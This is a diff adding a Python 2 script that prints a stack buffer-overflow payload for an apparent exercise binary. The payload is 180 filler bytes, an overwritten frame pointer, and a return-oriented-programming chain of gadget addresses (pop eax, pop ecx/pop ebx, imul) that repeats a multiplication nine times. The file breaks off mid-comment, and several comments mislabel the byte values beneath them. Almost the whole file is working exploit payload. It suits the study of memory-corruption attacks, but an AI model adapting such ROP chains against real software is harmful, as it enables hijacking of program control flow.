@@ -1,0 +1,256 @@
+#Fill in the cat_buf buffer
+print "a"*180
+#Fill in the correct ebp value
+print "\xa0" + ("a"*14)
+print "\xcd" + ("a"*14)
+print "\xff" + ("a"*14)
+print "\xff" + ("a"*14)
+#Write GA1 : pop eax;ret;
+print "\x66" + ("a"*14)
+print "\xb1" + ("a"*14)
+print "\x0b" + ("a"*14)
+print "\x08" + ("a"*14)
+#Write 0x1 (the value to be popped into eax)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x01" + ("a"*14)
+
+
+'''Do the multiplication 9 times'''
+#Write GA4 : pop ecx ; pop ebx ; ret
+print "\x11" + ("a"*14)
+print "\xed" + ("a"*14)
+print "\x06" + ("a"*14)
+print "\x08" + ("a"*14)
+#Write 0x2 (the value to be popped into ecx)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x02" + ("a"*14)
+#Write 0x0 (random value to be popped into ebx) - because GA4 has an extra ebx
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x02" + ("a"*14)
+#Write GA3 : imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret
+print "\xe8" + ("a"*14)
+print "\x34" + ("a"*14)
+print "\x06" + ("a"*14)
+print "\x08" + ("a"*14)
+#Write 0x0 (random value to be popped into ebx) - because GA3 has an extra ebx
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x02" + ("a"*14)
+
+#Write GA4 : pop ecx ; pop ebx ; ret
+print "\x11" + ("a"*14)
+print "\xed" + ("a"*14)
+print "\x06" + ("a"*14)
+print "\x08" + ("a"*14)
+#Write 0x2 (the value to be popped into ecx)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x03" + ("a"*14)
+#Write 0x0 (random value to be popped into ebx) - because GA4 has an extra ebx
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x02" + ("a"*14)
+#Write GA3 : imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret
+print "\xe8" + ("a"*14)
+print "\x34" + ("a"*14)
+print "\x06" + ("a"*14)
+print "\x08" + ("a"*14)
+#Write 0x0 (random value to be popped into ebx) - because GA3 has an extra ebx
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x02" + ("a"*14)
+
+#Write GA4 : pop ecx ; pop ebx ; ret
+print "\x11" + ("a"*14)
+print "\xed" + ("a"*14)
+print "\x06" + ("a"*14)
+print "\x08" + ("a"*14)
+#Write 0x2 (the value to be popped into ecx)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x04" + ("a"*14)
+#Write 0x0 (random value to be popped into ebx) - because GA4 has an extra ebx
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x02" + ("a"*14)
+#Write GA3 : imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret
+print "\xe8" + ("a"*14)
+print "\x34" + ("a"*14)
+print "\x06" + ("a"*14)
+print "\x08" + ("a"*14)
+#Write 0x0 (random value to be popped into ebx) - because GA3 has an extra ebx
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x02" + ("a"*14)
+
+#Write GA4 : pop ecx ; pop ebx ; ret
+print "\x11" + ("a"*14)
+print "\xed" + ("a"*14)
+print "\x06" + ("a"*14)
+print "\x08" + ("a"*14)
+#Write 0x2 (the value to be popped into ecx)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x05" + ("a"*14)
+#Write 0x0 (random value to be popped into ebx) - because GA4 has an extra ebx
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x02" + ("a"*14)
+#Write GA3 : imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret
+print "\xe8" + ("a"*14)
+print "\x34" + ("a"*14)
+print "\x06" + ("a"*14)
+print "\x08" + ("a"*14)
+#Write 0x0 (random value to be popped into ebx) - because GA3 has an extra ebx
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x02" + ("a"*14)
+
+#Write GA4 : pop ecx ; pop ebx ; ret
+print "\x11" + ("a"*14)
+print "\xed" + ("a"*14)
+print "\x06" + ("a"*14)
+print "\x08" + ("a"*14)
+#Write 0x2 (the value to be popped into ecx)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x06" + ("a"*14)
+#Write 0x0 (random value to be popped into ebx) - because GA4 has an extra ebx
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x02" + ("a"*14)
+#Write GA3 : imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret
+print "\xe8" + ("a"*14)
+print "\x34" + ("a"*14)
+print "\x06" + ("a"*14)
+print "\x08" + ("a"*14)
+#Write 0x0 (random value to be popped into ebx) - because GA3 has an extra ebx
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x02" + ("a"*14)
+
+#Write GA4 : pop ecx ; pop ebx ; ret
+print "\x11" + ("a"*14)
+print "\xed" + ("a"*14)
+print "\x06" + ("a"*14)
+print "\x08" + ("a"*14)
+#Write 0x2 (the value to be popped into ecx)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x07" + ("a"*14)
+#Write 0x0 (random value to be popped into ebx) - because GA4 has an extra ebx
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x02" + ("a"*14)
+#Write GA3 : imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret
+print "\xe8" + ("a"*14)
+print "\x34" + ("a"*14)
+print "\x06" + ("a"*14)
+print "\x08" + ("a"*14)
+#Write 0x0 (random value to be popped into ebx) - because GA3 has an extra ebx
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x02" + ("a"*14)
+
+#Write GA4 : pop ecx ; pop ebx ; ret
+print "\x11" + ("a"*14)
+print "\xed" + ("a"*14)
+print "\x06" + ("a"*14)
+print "\x08" + ("a"*14)
+#Write 0x2 (the value to be popped into ecx)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x08" + ("a"*14)
+#Write 0x0 (random value to be popped into ebx) - because GA4 has an extra ebx
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x02" + ("a"*14)
+#Write GA3 : imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret
+print "\xe8" + ("a"*14)
+print "\x34" + ("a"*14)
+print "\x06" + ("a"*14)
+print "\x08" + ("a"*14)
+#Write 0x0 (random value to be popped into ebx) - because GA3 has an extra ebx
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x02" + ("a"*14)
+
+#Write GA4 : pop ecx ; pop ebx ; ret
+print "\x11" + ("a"*14)
+print "\xed" + ("a"*14)
+print "\x06" + ("a"*14)
+print "\x08" + ("a"*14)
+#Write 0x2 (the value to be popped into ecx)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x09" + ("a"*14)
+#Write 0x0 (random value to be popped into ebx) - because GA4 has an extra ebx
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x02" + ("a"*14)
+#Write GA3 : imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret
+print "\xe8" + ("a"*14)
+print "\x34" + ("a"*14)
+print "\x06" + ("a"*14)
+print "\x08" + ("a"*14)
+#Write 0x0 (random value to be popped into ebx) - because GA3 has an extra ebx
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x02" + ("a"*14)
+
+#Write GA4 : pop ecx ; pop ebx ; ret
+print "\x11" + ("a"*14)
+print "\xed" + ("a"*14)
+print "\x06" + ("a"*14)
+print "\x08" + ("a"*14)
+#Write 0x2 (the value to be popped into ecx)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x0a" + ("a"*14)
+#Write 0x0 (random value to be popped into ebx) - because GA4 has an extra ebx
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x02" + ("a"*14)
+#Write GA3 : imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret
+print "\xe8" + ("a"*14)
+print "\x34" + ("a"*14)
+print "\x06" + ("a"*14)
+print "\x08" + ("a"*14)
+#Write 0x0 (random value to be popped into ebx) - because GA3 has an extra ebx
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x00" + ("a"*14)
+print "\x02" + ("a"*14)
+
+
+'''Filling GDB with the correct value
